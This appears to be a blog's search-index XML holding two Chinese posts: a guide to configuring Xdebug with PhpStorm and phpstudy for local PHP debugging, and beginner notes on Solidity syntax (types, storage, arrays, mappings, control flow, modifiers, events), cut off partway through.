<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/article/2023-02-07-phpstrom%E9%85%8D%E7%BD%AExdebug%E8%AE%B0%E5%BD%95/"/>
      <url>/article/2023-02-07-phpstrom%E9%85%8D%E7%BD%AExdebug%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: phpstrom配置xdebug记录</span><br><span class="line">date: 2023-02-07</span><br><span class="line">categories: </span><br><span class="line">- php</span><br><span class="line">tags:</span><br><span class="line">- php</span><br><span class="line">- ctf</span><br><span class="line">top_img: https://img.paulzzh.tech/touhou/random </span><br><span class="line">cover: https://www.osgeo.cn/solidity/_static/logo.svg</span><br></pre></td></tr></table></figure><p>简单整理一下之前记录的东西。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="phpstrom"><a href="#phpstrom" class="headerlink" title="phpstrom"></a>phpstrom</h2><p>关于phpstrom的安装和激活自行解决。</p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xp.cn/</span><br></pre></td></tr></table></figure><p>支持CentOS、Ubuntu、Debian、Fedora、deepin，Web端管理，QQ群及论坛技术支持</p><p>一键创建网站、FTP、数据库、SSL；安全管理，计划任务，文件管理，PHP多版本共存及切换；自带LNMP与LAMP</p><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><p>想要动态调试就离不开xdebug，可以从下面选择合适自己的版本进行安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装手册：https://xdebug.org/docs/install</span><br><span class="line">最新版本下载：https://xdebug.org/download</span><br><span class="line">历史版本：https://xdebug.org/download/historical</span><br></pre></td></tr></table></figure><p>这个位置下载的版本一定要跟自己的php版本对应起来比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xdebug.org/files/php_xdebug-3.1.6-7.3-vc15-x86_64.dll</span><br></pre></td></tr></table></figure><p>下载完直接丢在<code>phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>这个目录中</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="设置PHP环境"><a href="#设置PHP环境" class="headerlink" title="设置PHP环境"></a>设置PHP环境</h2><p>phpstrom中的设置路径为：file-seting-languages-PHP（文件-设置-语言-PHP）这个路径跟phpstrom的版本有关系可能存在不同的路径，但是都是要找这个PHP设置：</p><p><img src="../../image/media/code/php/xdebug/0.png"></p><p>弹出如下信息可以设置xdebug和相关的PHP版本</p><p><img src="../../image/media/code/php/xdebug/00.png"></p><p>php.ini在最后添加如下代码：下面的路径记得修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">xdebug.profiler_output_dir=<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\tmp&quot;</span></span><br><span class="line">xdebug.trace_output_dir=<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\tmp\xdebug&quot;</span></span><br><span class="line">zend_extension=<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></span><br><span class="line">;zend_extension=<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">xdebug.remote_port=<span class="number">9001</span></span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.idekey=<span class="string">&quot;PHPSTORM&quot;</span></span><br><span class="line">xdebug.profiler_enable=Off</span><br><span class="line">xdebug.profiler_enable_trigger = off</span><br><span class="line">xdebug.profiler_output_dir=<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\tmp&quot;</span></span><br><span class="line">xdebug.show_local_vars=<span class="number">0</span></span><br><span class="line">xdebug.profiler_output_dir=<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\tmp&quot;</span></span><br></pre></td></tr></table></figure><p>zend_extension的值应该是我们刚刚下载的<code>php_xdebug.dll</code>所在的位置</p><h2 id="在PHPstrom中设置Server"><a href="#在PHPstrom中设置Server" class="headerlink" title="在PHPstrom中设置Server"></a>在PHPstrom中设置Server</h2><p>路径为：file-seting-languages-server</p><p><img src="../../image/media/code/php/xdebug/1.png"></p><h2 id="设置PHPdebug"><a href="#设置PHPdebug" class="headerlink" title="设置PHPdebug"></a>设置PHPdebug</h2><p>路径为file-seting-languages-debug</p><p><img src="../../image/media/code/php/xdebug/2.png"></p><h2 id="设置DBGp-proxy"><a href="#设置DBGp-proxy" class="headerlink" title="设置DBGp proxy"></a>设置DBGp proxy</h2><p>路径为file-seting-languages-debug-DBGp proxy</p><p><img src="../../image/media/code/php/xdebug/3.png"></p><h2 id="设置configurations"><a href="#设置configurations" class="headerlink" title="设置configurations"></a>设置configurations</h2><p>路径</p><p><img src="../../image/media/code/php/xdebug/11.png"></p><p>具体设置</p><p><img src="../../image/media/code/php/xdebug/4.png"></p><p>网站源码要在WWW目录下，浏览器设置xdebug插件为debug</p><p><img src="../../image/media/code/php/xdebug/6.png"></p><p>phpstrom下断点开始调试：</p><p><img src="../../image/media/code/php/xdebug/12.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Blockchain纪要</title>
      <link href="/article/2023-02-08-Blockchain%E7%BA%AA%E8%A6%81/"/>
      <url>/article/2023-02-08-Blockchain%E7%BA%AA%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h2 id="固定格式"><a href="#固定格式" class="headerlink" title="固定格式"></a>固定格式</h2><p>solidity的注释由“//”开头，后面跟注释的内容（不会被程序运行）。</p><p>Solidity 语句以分号（;）结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT   //软件许可</span><br><span class="line">pragma solidity ^0.8.4;  //solidity版本</span><br><span class="line">contract HelloWeb3&#123;  //创建合约</span><br><span class="line">    string public _string = &quot;Hello Web3!&quot;;//合约内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行是表示声明软件许可（license），不写会报错waring。</p><p>第二行是表示solidity版本，意思是源文件将不允许小于 0.8.4 版本或大于等于 0.9.0 版本的编译器编译（第二个条件由<code>^</code>提供）。</p><p>第三行是表示创建合约（contract），并且声明合约的名字为：HelloWeb3。</p><p>第四行是声明字符串变量共有属性变量名为_string，赋值为”Hello Web3!”。</p><h2 id="solidity纪要"><a href="#solidity纪要" class="headerlink" title="solidity纪要"></a>solidity纪要</h2><h3 id="创建合约"><a href="#创建合约" class="headerlink" title="创建合约"></a>创建合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  //软件许可</span><br><span class="line">pragma solidity合约版本;</span><br><span class="line">contract 合约名称&#123;</span><br><span class="line">//合约内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h4><table><thead><tr><th>类型</th><th>关键字</th><th>运算符</th></tr></thead><tbody><tr><td>布尔类型</td><td>bool</td><td>!、&amp;&amp;、||、==、!=</td></tr><tr><td>整型</td><td>int、uint、uint256</td><td>&lt;=，&lt;，==，!=，&gt;=，&gt;，+，-，-（负），*，/，%（余），**（幂）</td></tr><tr><td>地址类型</td><td>address</td><td>成员balance、transfer()</td></tr><tr><td>字节数组</td><td>byte、bytes8、bytes32</td><td></td></tr><tr><td>枚举</td><td>enum</td><td></td></tr></tbody></table><p>hints：在布尔值中<code>&amp;&amp;</code> 和 <code>||</code>运算符遵循短路规则。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 布尔值</span><br><span class="line">bool public  = true;</span><br><span class="line"></span><br><span class="line">// 整型</span><br><span class="line">int public _int = -1; // 整数，包括负数</span><br><span class="line">uint public _uint = 1; // 正整数</span><br><span class="line">uint256 public _number = 20220330; // 256位正整数</span><br><span class="line"></span><br><span class="line">// 地址</span><br><span class="line">address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;</span><br><span class="line">address payable public _address1 = payable(_address); // payable address，可以转账、查余额</span><br><span class="line">// 地址类型的成员</span><br><span class="line">uint256 public balance = _address1.balance; // balance of address</span><br><span class="line"></span><br><span class="line">// 固定长度的字节数组</span><br><span class="line">bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">bytes1 public _byte = _byte32[0]; </span><br></pre></td></tr></table></figure><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>索引表：<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions</a></p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>)给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。</li><li><code>block.coinbase</code>: (<code>address payable</code>) 当前区块矿工的地址</li><li><code>block.gaslimit</code>: (<code>uint</code>) 当前区块的gaslimit</li><li><code>block.number</code>: (<code>uint</code>) 当前区块的number</li><li><code>block.timestamp</code>: (<code>uint</code>) 当前区块的时间戳，为unix纪元以来的秒</li><li><code>gasleft()</code>: (<code>uint256</code>) 剩余 gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) 完整call data</li><li><code>msg.sender</code>: (<code>address payable</code>) 消息发送者 (当前 caller)，部署者的地址</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldata的前四个字节 (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) 当前交易发送的<code>wei</code>值</li></ul><h4 id="变量初始值"><a href="#变量初始值" class="headerlink" title="变量初始值"></a>变量初始值</h4><p>在<code>solidity</code>中，声明但没赋值的变量都有它的初始值或默认值。</p><h5 id="数值类"><a href="#数值类" class="headerlink" title="数值类"></a>数值类</h5><ul><li><code>boolean</code>: <code>false</code></li><li><code>string</code>: <code>&quot;&quot;</code></li><li><code>int</code>: <code>0</code></li><li><code>uint</code>: <code>0</code></li><li><code>enum</code>: 枚举中的第一个元素</li><li><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (或 <code>address(0)</code>)</li><li><code>function</code><ul><li><code>internal</code>: 空白方程</li><li><code>external</code>: 空白方程</li></ul></li></ul><h5 id="引用类"><a href="#引用类" class="headerlink" title="引用类"></a>引用类</h5><ul><li>映射<code>mapping</code>: 所有元素都为其默认值的<code>mapping</code></li><li>结构体<code>struct</code>: 所有成员设为其默认值的结构体</li><li>数组<code>array</code><ul><li>动态数组: <code>[]</code></li><li>静态数组（定长）: 所有成员设为其默认值的静态数组</li></ul></li></ul><h4 id="delete操作"><a href="#delete操作" class="headerlink" title="delete操作"></a>delete操作</h4><p><code>delete a</code>会让变量<code>a</code>的值变为初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// delete操作符</span><br><span class="line">bool public _bool2 = true; </span><br><span class="line">function d() external &#123;</span><br><span class="line">    delete _bool2; // delete 会让_bool2变为默认值，false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="常量constant"><a href="#常量constant" class="headerlink" title="常量constant"></a>常量constant</h4><p><code>constant</code>变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// constant变量必须在声明的时候初始化，之后不能改变</span><br><span class="line">uint256 constant CONSTANT_NUM = 10;</span><br><span class="line">string constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br></pre></td></tr></table></figure><h4 id="不变量immutable"><a href="#不变量immutable" class="headerlink" title="不变量immutable"></a>不变量immutable</h4><p><code>immutable</code>变量可以在声明时或构造函数中初始化，因此更加灵活。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// immutable变量可以在constructor里初始化，之后不能改变</span><br><span class="line">   uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">   address public immutable IMMUTABLE_ADDRESS;</span><br></pre></td></tr></table></figure><p>使用全局变量例如<code>address(this)</code>，<code>block.number</code> ，或者自定义的函数给<code>immutable</code>变量初始化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 利用constructor初始化immutable变量，因此可以利用</span><br><span class="line">constructor()&#123;</span><br><span class="line">IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">IMMUTABLE_BLOCK = block.number;</span><br><span class="line">IMMUTABLE_TEST = test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() public pure returns(uint256)&#123;</span><br><span class="line">uint256 what = 9;</span><br><span class="line">return(what);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数据位置"><a href="#数据位置" class="headerlink" title="数据位置"></a>数据位置</h4><p>solidity数据存储位置有三类：<code>storage</code>，<code>memory</code>和<code>calldata</code>。不同存储位置的<code>gas</code>成本不同。<code>storage</code>类型的数据存在链上，类似计算机的硬盘，消耗<code>gas</code>多；<code>memory</code>和<code>calldata</code>类型的临时存在内存里，消耗<code>gas</code>少</p><ol><li><code>storage</code>：合约里的状态变量默认都是<code>storage</code>，存储在链上。</li><li><code>memory</code>：函数里的参数和临时变量一般用<code>memory</code>，存储在内存中，不上链。</li><li><code>calldata</code>：和<code>memory</code>类似，存储在内存中，不上链。与<code>memory</code>的不同点在于<code>calldata</code>变量不能修改（<code>immutable</code>），一般用于函数的参数。</li></ol><h4 id="赋值规则"><a href="#赋值规则" class="headerlink" title="赋值规则"></a>赋值规则</h4><ul><li><p><code>storage</code>（合约的状态变量）赋值给本地<code>storage</code>（函数里的）时候，会创建引用，改变新变量会影响原变量。</p></li><li><p><code>storage</code>赋值给<code>memory</code>，会创建独立的复本，修改其中一个不会影响另一个；反之亦然。</p></li><li><p><code>memory</code>赋值给<code>memory</code>，会创建引用，改变新变量会影响原变量。</p></li><li><p>其他情况，变量赋值给<code>storage</code>，会创建独立的复本，修改其中一个不会影响另一个。</p></li></ul><h3 id="数组array"><a href="#数组array" class="headerlink" title="数组array"></a>数组array</h3><ul><li>固定长度数组：在声明时指定数组的长度。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度 Array</span><br><span class="line">uint[8] array1;</span><br></pre></td></tr></table></figure><ul><li>可变长度数组（动态数组）：在声明时不指定数组的长度。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 可变长度 Array</span><br><span class="line">uint[] array4;</span><br></pre></td></tr></table></figure><ul><li>对于<code>memory</code>修饰的<code>动态数组</code>，可以用<code>new</code>操作符来创建，但是必须声明长度，并且声明后长度不能改变。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><ul><li>如果创建的是动态数组，你需要一个一个元素的赋值。</li></ul><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><ul><li><code>length</code>: 数组有一个包含元素数量的<code>length</code>成员，<code>memory</code>数组的长度在创建后是固定的。</li><li><code>push()</code>: <code>动态数组</code>和<code>bytes</code>拥有<code>push()</code>成员，可以在数组最后添加一个<code>0</code>元素。</li><li><code>push(x)</code>: <code>动态数组</code>和<code>bytes</code>拥有<code>push(x)</code>成员，可以在数组最后添加一个<code>x</code>元素。</li><li><code>pop()</code>: <code>动态数组</code>和<code>bytes</code>拥有<code>pop()</code>成员，可以移除数组最后一个元素。</li></ul><h3 id="结构体struct"><a href="#结构体struct" class="headerlink" title="结构体struct"></a>结构体struct</h3><p><code>Solidity</code>支持通过构造结构体的形式定义新的类型。创建结构体的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">uint256 id;</span><br><span class="line">uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">Student student; // 初始一个student结构体</span><br></pre></td></tr></table></figure><h4 id="结构体赋值"><a href="#结构体赋值" class="headerlink" title="结构体赋值"></a>结构体赋值</h4><ul><li>在函数中创建一个storage的struct引用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//  给结构体赋值</span><br><span class="line">// 方法1:在函数中创建一个storage的struct引用</span><br><span class="line">function initStudent1() external&#123;</span><br><span class="line">Student storage _student = student; // assign a copy of student</span><br><span class="line">_student.id = 11;</span><br><span class="line">_student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>直接引用状态变量的struct</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 方法2:直接引用状态变量的struct</span><br><span class="line">function initStudent2() external&#123;</span><br><span class="line">student.id = 1;</span><br><span class="line">student.score = 80;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射Mapping"><a href="#映射Mapping" class="headerlink" title="映射Mapping"></a>映射Mapping</h3><p>在映射中，人们可以通过键（<code>Key</code>）来查询对应的值（<code>Value</code>）</p><p>声明映射的格式为<code>mapping(_KeyType =&gt; _ValueType)</code>，其中<code>_KeyType</code>和<code>_ValueType</code>分别是<code>Key</code>和<code>Value</code>的变量类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h4 id="映射规则"><a href="#映射规则" class="headerlink" title="映射规则"></a>映射规则</h4><ul><li><p>映射的<code>_KeyType</code>只能选择<code>solidity</code>默认的类型，比如<code>uint</code>，<code>address</code>等，不能用自定义的结构体。而<code>_ValueType</code>可以使用自定义的类型。</p></li><li><p>映射的存储位置必须是<code>storage</code>，因此可以用于合约的状态变量，函数中的<code>storage</code>变量，和library函数的参数。不能用于<code>public</code>函数的参数或返回结果中，因为<code>mapping</code>记录的是一种关系 (key - value pair)。</p></li><li><p>如果映射声明为<code>public</code>，那么<code>solidity</code>会自动给你创建一个<code>getter</code>函数，可以通过<code>Key</code>来查询对应的<code>Value</code>。</p></li><li><p>给映射新增的键值对的语法为<code>_Var[_Key] = _Value</code>，其中<code>_Var</code>是映射变量名，<code>_Key</code>和<code>_Value</code>对应新增的键值对。</p></li></ul><h4 id="映射原理"><a href="#映射原理" class="headerlink" title="映射原理"></a>映射原理</h4><ul><li>映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</li><li>映射使用<code>keccak256(key)</code>当成offset存取value。</li><li>因为Ethereum会定义所有未使用的空间为0，所以未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是0。</li></ul><h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><p><code>Solidity</code>的控制流与其他语言类似，主要包含以下几种：</p><h4 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">    if(_number == 0)&#123;</span><br><span class="line">    return(true);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    return(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    while(i &lt; 10)&#123;</span><br><span class="line">    sum += i;</span><br><span class="line">    i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    do&#123;</span><br><span class="line">    sum += i;</span><br><span class="line">    i++;</span><br><span class="line">    &#125;while(i &lt; 10);</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>三元运算符是<code>solidity</code>中唯一一个接受三个操作数的运算符，规则<code>条件? 条件为真的表达式:条件为假的表达式</code>。 此运算符经常用作 if 语句的快捷方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//条件? 条件为真的表达式:条件为假的表达式</span><br><span class="line">// 三元运算符 ternary/conditional operator</span><br><span class="line">function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">    // return the max of x and y</span><br><span class="line">    return x &gt;= y ? x: y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有<code>continue</code>（立即进入下一个循环）和<code>break</code>（跳出当前循环）关键字可以使用。</p><h3 id="函数function"><a href="#函数function" class="headerlink" title="函数function"></a>函数function</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//function 函数名称 (函数参数) 函数可见性 函数权限 返回变量类型和名称</span><br><span class="line">function &lt;function name&gt; (&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)]</span><br><span class="line"></span><br><span class="line">//pure不能读取也不能写入存储在链上的状态变量</span><br><span class="line">//view能读取但也不能写入状态变量</span><br></pre></td></tr></table></figure><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>return和returns，区别</p><ul><li><code>returns</code>加在函数名后面，用于声明返回的变量类型及变量名；</li><li><code>return</code>用于函数主体中，返回指定的变量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 返回多个变量</span><br><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br><span class="line">//返回值变量类型为：uint256, bool, uint256[3] memory放回值为1, true, [uint256(1),2,5]</span><br></pre></td></tr></table></figure><h4 id="构造函数constructor"><a href="#构造函数constructor" class="headerlink" title="构造函数constructor"></a>构造函数constructor</h4><p>构造函数（<code>constructor</code>）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address owner; // 定义owner变量</span><br><span class="line"></span><br><span class="line">// 构造函数</span><br><span class="line">constructor() &#123;</span><br><span class="line">   owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修饰器modifier"><a href="#修饰器modifier" class="headerlink" title="修饰器modifier"></a>修饰器modifier</h3><p>修饰器（<code>modifier</code>）是<code>solidity</code>特有的语法，类似于面向对象编程中的<code>decorator</code>，声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。<code>modifier</code>的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 定义modifier</span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">     require(msg.sender == owner); // 检查调用者是否为owner地址</span><br><span class="line">     _; // 如果是的话，继续运行函数主体；否则报错并revert交易</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>代有<code>onlyOwner</code>修饰符的函数只能被<code>owner</code>地址调用，比如下面这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">     owner = _newOwner; // 只有owner地址运行这个函数，并改变owner</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>changeOwner</code>函数，运行他可以改变合约的<code>owner</code>，但是由于<code>onlyOwner</code>修饰符的存在，只有原先的<code>owner</code>可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p><h3 id="事件event"><a href="#事件event" class="headerlink" title="事件event"></a>事件event</h3><p><code>Solidity</code>中的事件（<code>event</code>）是<code>EVM</code>上日志的抽象，它具有两个特点：</p><ul><li>响应：应用程序（<a href="https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18"><code>ether.js</code></a>）可以通过<code>RPC</code>接口订阅和监听这些事件，并在前端做响应。</li><li>经济：事件是<code>EVM</code>上比较经济的存储数据的方式，每个大概消耗2,000 <code>gas</code>；相比之下，链上存储一个新变量至少需要20,000 <code>gas</code>。</li></ul><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>事件的声明由<code>event</code>关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以<code>ERC20</code>代币合约的<code>Transfer</code>事件为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 